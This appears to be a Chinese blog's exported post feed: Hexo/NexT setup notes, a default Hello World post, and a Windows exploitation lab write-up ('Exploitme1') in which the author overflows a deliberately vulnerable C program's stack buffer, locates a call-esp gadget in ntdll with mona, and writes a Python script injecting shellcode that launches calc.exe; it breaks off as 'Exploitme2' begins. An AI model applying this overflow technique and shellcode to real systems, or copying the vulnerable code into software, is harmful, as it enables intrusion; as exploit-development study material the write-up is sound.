<h3 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h3><p>打开站点配置文件</p>
<h4 id="修改语言"><a href="#修改语言" class="headerlink" title="修改语言"></a>修改语言</h4><p>搜索 <code>language</code>，找到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">author:</span><br><span class="line">language:</span><br><span class="line">timezone:</span><br></pre></td></tr></table></figure>

<p>在 language 后面输入 <strong>zh-CN</strong>，并修改作者名</p>
<h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>打开主题配置文件</p>
<h3 id="开启分类和标签"><a href="#开启分类和标签" class="headerlink" title="开启分类和标签"></a>开启分类和标签</h3><p>搜索 <code>menu</code>，找到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  #schedule: /schedule/ || fa fa-calendar</span><br><span class="line">  #sitemap: /sitemap.xml || fa fa-sitemap</span><br><span class="line">  #commonweal: /404/ || fa fa-heartbeat</span><br></pre></td></tr></table></figure>

<p>执行以下命令，会在<code>source/</code>目录下分别创建<code>about</code> <code>tags</code> 和 <code>categories</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>

<p>分别修改以上三个目录中的<code>index.md</code>文件，添加以下语句，以标明各自用途</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">type: &quot;about&quot;</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>

<p>之后就可以在文章的头部添加 <code>tags</code> 和 <code>categories</code>，<code>hexo</code>会自动进行识别，比如：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Create a Blog with Hexo</span><br><span class="line">date: 2023-10-17 16:17:38</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">-</span> blog</span><br><span class="line"><span class="bullet">-</span> hexo</span><br><span class="line"><span class="bullet">-</span> next</span><br><span class="line">categories: 其它</span><br></pre></td></tr></table></figure>

<h4 id="切换小主题"><a href="#切换小主题" class="headerlink" title="切换小主题"></a>切换小主题</h4><p>next 主题自带<strong>四种样式</strong></p>
<p>搜索<code>Schemes</code>，选择喜欢的样式，取消对应行前的注释</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>

<h4 id="隐藏驱动提示"><a href="#隐藏驱动提示" class="headerlink" title="隐藏驱动提示"></a>隐藏驱动提示</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line"><span class="attr">powered:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h4 id="首页文章折叠"><a href="#首页文章折叠" class="headerlink" title="首页文章折叠"></a>首页文章折叠</h4><p>在文章中想要结束预览的位置，添加以下标签：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="功能强化"><a href="#功能强化" class="headerlink" title="功能强化"></a>功能强化</h2><h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><p>安装插件<code>hexo-generator-searchdb</code>，命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p>在站点配置文件 <code>_config.yaml</code> 文件中增加以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>

<p>在主题配置文件 <code>_config.next.yaml</code> 中启用本地搜索功能：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="多端同步"><a href="#多端同步" class="headerlink" title="多端同步"></a>多端同步</h2><p>参考链接</p>
<ul>
<li><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)-CSDN博客</a></p>
</li>
<li><p><a href="https://blog.guaoxiaohei.me/posts/Hexo-Level/">Hexo NexT文章中标题自动编号 | 孤傲小黑的博客 (guaoxiaohei.me)</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/476603074?utm_id=0">Hexo搭建博客的多终端同步问题 - 知乎 (zhihu.com)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>else</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>Create a Plugin for Immunity Debugger</title>
    <url>/2023/10/23/Windwos-PWN/Create-a-Plugin-for-Immunity-Debugger/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/17/else/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Exploitme1——栈上执行Shellcode</title>
    <url>/2023/10/19/Windwos-PWN/Exploitme/Exploitme1/</url>
    <content><![CDATA[<p>参考链接</p>
<ul>
<li><a href="https://tttang.com/archive/680/#toc_0x01-exploitme1-ret-eip-overwrite-more-space-on-stack">Exploit开发系列教程-Exploitme1 (“ret eip” overwrite) &amp;More space on stack - 跳跳糖 (tttang.com)</a></li>
</ul>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><p>visual studio : windows上还是得用这个，mingw不够友好</p>
<ul>
<li><p>配置：修改配置时，记得正确调整配置模式和平台，这里选用 所有配置+所有平台。</p>
<ul>
<li>禁用安全检查 &#x2F;GS-（配置属性—&gt;C&#x2F;C++—&gt;代码生成—&gt;安全检查）</li>
<li>关闭数据执行保护 &#x2F;NXCOMPAT:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
<li>关闭随机基址 &#x2F;DYNAMICBASE:NO （配置属性—&gt;链接器—&gt;高级—&gt;数据执行保护(DEP)）</li>
</ul>
</li>
<li><p>技巧：</p>
<ul>
<li>启动调试后，（已默认开启地址级调试）可以通过 <code>调试—&gt;窗口—&gt;反汇编</code> 查看程序的反汇编，快捷键 ctrl+alt+d</li>
</ul>
</li>
</ul>
</li>
<li><p>windbg : windows上绕不过去的调试器，早上手早熟练；</p>
<ul>
<li><p>如果使用windows商店下载的windbg，虽然好看，但需要解决权限问题，比较麻烦（后面需要往windbg文件夹里添加文件，或者复制一份到普通目录下），<a href="https://www.zhihu.com/question/321693587">权限问题解决</a></p>
</li>
<li><p>也可以下载 WDK，使用里面带的 windbg，下载链接：<a href="https://learn.microsoft.com/zh-CN/windows-hardware/drivers/other-wdk-downloads#step-2-install-the-wdk">WDK 下载 </a></p>
</li>
</ul>
</li>
<li><p>python2 ： 建议从官网下载<code>2.7.18</code>安装版，如果使用pyenv或其他python版本管理工具下载便携版，后面可能会因为缺少注册表项出问题（比如找不到python或者<code>failed to load python module</code>)</p>
<ul>
<li><p>下载链接：<a href="https://www.python.org/downloads/windows/">Python Releases for Windows | Python.org</a> 注意32位还是64位需要和使用的windbg保持一致</p>
</li>
<li><p>之后下安装<code>pykd</code>包，不然运行插件后会出现“Do not run this script outside of a debugger !”，命令和下面相似</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Python27\Scripts&gt; .\pip.exe install pykd</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>mona 插件</p>
<ul>
<li>下载链接：<a href="https://github.com/corelan/windbglib">corelan&#x2F;windbglib</a></li>
<li>如果上面下载的<code>pykd.pyd</code>没办法使用，可以从这里下载 <a href="https://github.com/hac425xxx/pykd-ext/releases/tag/pykd_ext_2.0.0.24">pykd_ext</a>，将解压后得到的 pykd.dll 放到对应目录即可。</li>
</ul>
</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><p>一个存在漏洞的c&#x2F;c++程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name and press ENTER\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果运行程序后，输入的字符超过32个，比如32个“a”+4个“b“+4个”c”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>

<p>会出现以下情况</p>
<ul>
<li><p>debug模式下，<code>运行时检查</code>会检查到输入过长破坏了<code>name</code>变量</p>
</li>
<li><p>release模式下</p>
<ul>
<li><p>运行，以非0的错误代码（如-1073741819）退出</p>
</li>
<li><p>调试，显示触发异常的地址为 0x63636363，符合预期</p>
<p><img src="/../pic/Exploitme/%E6%9C%AA%E7%BB%8F%E5%A4%84%E7%90%86%E7%9A%84%E5%BC%82%E5%B8%B8.png" alt="未经处理的异常"></p>
</li>
</ul>
</li>
</ul>
<p>为了方便，之后我们只在<code>release</code>模式下运行即可。</p>
<p>为了更简洁地描述，我们修改程序，让文本内容可从文件<code>name.dat</code>中被读取，编译后运行结果和上面一致</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;rb&quot;</span>); # 注意要使用绝对路径，不然下面使用的windbg找不到该文件</span><br><span class="line">    <span class="keyword">if</span> (!f)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> bytes = ftell(f);</span><br><span class="line">    fseek(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">    fread(name, <span class="number">1</span>, bytes, f);</span><br><span class="line">    name[bytes] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    fclose(f);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi, %s!\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>name.dat:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc</span><br></pre></td></tr></table></figure>

<h3 id="使用-windbg-进行调试"><a href="#使用-windbg-进行调试" class="headerlink" title="使用 windbg 进行调试"></a>使用 windbg 进行调试</h3><p>使用<code>windbg</code>加载上面生成的程序<code>Exploitme.exe</code>，按<code>F5</code>或输入命令<code>g</code>，得到以下报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(31e0.4f48): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000000 ebx=0067b000 ecx=0fce700e edx=755d0334 esi=00c868e8 edi=00c8c2a8</span><br><span class="line">eip=63636363 esp=008ff888 ebp=62626262 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246</span><br><span class="line">63636363 ??              ???</span><br></pre></td></tr></table></figure>

<p>查看栈内存，我们希望cccc指向cccc之后的这块内存（当执行完main函数中的ret后，ESP寄存器的值刚好指向这里），我们会在这里填充shellcode。但由于ASLR（地址空间布局随机化，简称地址随机化），两次的ESP值不同，也就意味着我们无法将 cccc 替换为一个固定的地址。</p>
<p><img src="/../pic/Exploitme/aslr-for-stack.png" alt="aslr-for-stack"></p>
<p>不过，可以将 cccc 替换为一个指向 jmp ESP 指令的地址（代码段的指令的地址是固定的），程序执行流就会变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret ——&gt; jmp ESP --&gt; [shellcode]</span><br></pre></td></tr></table></figure>

<h3 id="使用mona"><a href="#使用mona" class="headerlink" title="使用mona"></a>使用mona</h3><p>为了寻找 jmp ESP 指令的地址，我们可以使用 mona 插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:000&gt; .load pykd</span><br><span class="line">0:000&gt; !pykd.info</span><br><span class="line"></span><br><span class="line">pykd bootstrapper version: 2.0.0.24</span><br><span class="line"></span><br><span class="line">Installed python:</span><br><span class="line"></span><br><span class="line">Version:        Status:     Image:</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">* 2.7 x86-32    Loaded      C:\Windows\SYSTEM32\python27.dll  # 注意要选用python2，如果默认指向了python3，可使用 !pykd.select -2.7进行切换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:000&gt; !py mona jmp -r ESP -m ntdll.dll	# 尝试了 kernel32.dll 没找到符合要求得指令，在 ntdll.dll 中找到了</span><br><span class="line"></span><br><span class="line">** You are running pykd.pyd v0.3.4.15. Use at your own risk **</span><br><span class="line"></span><br><span class="line">Hold on...</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    - Search complete, processing results</span><br><span class="line">[+] Preparing output file &#x27;jmp.txt&#x27;</span><br><span class="line">    - (Re)setting logfile jmp.txt</span><br><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 1 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 4 </span><br><span class="line">[+] Results : </span><br><span class="line">0x77bece33 |   0x77bece33 (b+0x0010ce33)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afb318 |   0x77afb318 (b+0x0001b318)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77afc712 |   0x77afc712 (b+0x0001c712)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd1f8 |   0x77bbd1f8 (b+0x000dd1f8)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">0x77bbd250 |   0x77bbd250 (b+0x000dd250)  : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [ntdll.dll] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.19041.3570 (ntdll.dll), 0x4140</span><br><span class="line">    Found a total of 5 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:00.759000</span><br></pre></td></tr></table></figure>

<p><code>mona</code>没有找到 <code>jmp ESP</code>指令，但找到了功能基本一致的<code>call ESP</code>和<code>push esp; ret</code>指令（这两种指令执行后，ESP的值不同，不过对我们影响不大），都能够将执行流引导至<code>shellcode</code>。</p>
<p>我们使用上面找的<code>call esp</code>指令，其地址为 <code>0x77bece33</code>（系统重启前有效，详情见 <a href="https://czxvan.github.io/2023/10/22/ASLR-in-Windows/">ASLR in Windows</a>）</p>
<h3 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h3><p>编写python脚本 <code>exp1.py</code>，修改<code>name.dat</code>中的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = <span class="string">b&#x27;\xcc&#x27;</span>	<span class="comment"># 调试模式下会在此中断</span></span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>

<p>回到visual studio，release模式下进行调试，main返回后，出现以下弹窗：</p>
<p><img src="/../pic/Exploitme/0xcc.png" alt="0xcc"></p>
<p>说明测试成功。</p>
<p>下面将 “\xcc” 替换为真正的 <code>shellcode</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret_eip = <span class="string">b&#x27;\x33\xce\xbe\x77&#x27;</span>	<span class="comment"># 小端序</span></span><br><span class="line">    shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line">    name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> + ret_eip + shellcode</span><br><span class="line">    f.write(name)</span><br></pre></td></tr></table></figure>

<p>其中，<code>shellcode</code>由以下程序得到，转换原理见 <a href="https://czxvan.github.io/2023/10/20/Create-Shellcode-in-Windows/">Create Shellcode in Windows</a>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WinExec                0x7bb4c07f</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line">    DefineFuncPtr(WinExec);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> calc[] = &#123; <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;     <span class="comment">// makes our shellcode shorter</span></span><br><span class="line">    My_WinExec(calc, SW_SHOW);</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后在release模式下运行程序，成功执行<code>shellcode</code>，弹出了一个计算器：</p>
<p><img src="/../pic/Exploitme/pwn.png" alt="pwn"></p>
<h2 id="复现补充（栈空间不足解决方案）"><a href="#复现补充（栈空间不足解决方案）" class="headerlink" title="复现补充（栈空间不足解决方案）"></a>复现补充（栈空间不足解决方案）</h2><p>在一次复现的时候，出现以下情况，程序在执行<code>fread</code>的过程中出错（存在随机性）：</p>
<p><img src="/../pic/Exploitme/fread_fault.png" alt="fread_fault"></p>
<p>这可能是因为栈上的空间不足，<code>fread</code>在读入数据时将栈底覆盖，导致程序出错。</p>
<p>解决方法为，将漏洞程序修改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"> </span><br><span class="line">_declspec(noinline) <span class="type">int</span> <span class="title function_">old_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading name from file...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&#x27;, &quot;</span>rb<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    if (!f)</span></span><br><span class="line"><span class="string">        return -1;</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_END);</span></span><br><span class="line"><span class="string">    long bytes = ftell(f);</span></span><br><span class="line"><span class="string">    fseek(f, 0L, SEEK_SET);</span></span><br><span class="line"><span class="string">    fread(name, 1, bytes, f);</span></span><br><span class="line"><span class="string">    name[bytes] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="string">    fclose(f);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    printf(&quot;</span>Hi, %s!\n<span class="string">&quot;, name);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// (1)(2)两点都是用来禁用优化的，有时候只用其中一个就能起到效果，有时候需要两个一起(取决于VS版本)</span></span><br><span class="line"><span class="string">#pragma optimize( &quot;</span><span class="string">&quot;, off )  // (1)关闭编译器优化</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    char moreStack[10000];</span></span><br><span class="line"><span class="string">    for (int i = 0; i &lt; sizeof(moreStack); ++i)  // (2)for循环中使用moreStack避免它被优化</span></span><br><span class="line"><span class="string">        moreStack[i] = i;</span></span><br><span class="line"><span class="string">    return old_main();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之后，再次运行，便可成功弹出计算器。</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Exploitme2——Stack cookies &amp; SEH</title>
    <url>/2023/10/24/Windwos-PWN/Exploitme/Exploitme2/</url>
    <content><![CDATA[<p>当程序开启<code>GS</code>保护时，我们无法再通过栈溢出覆盖返回地址的方式，来控制执行流。但还有一些其他的方式，比如劫持<code>SEH</code>。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://juejin.cn/post/6844903572509818887">Exploit开发系列教程-Exploitme2 (Stack cookies &amp; SEH) - 掘金 (juejin.cn)</a></li>
<li><a href="https://www.freebuf.com/vuls/239341.html">图解利用SEH过GS思路研究 - FreeBuf网络安全行业门户</a></li>
</ul>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>Visual Studio配置<ul>
<li>关闭<code>DEP</code>: <ul>
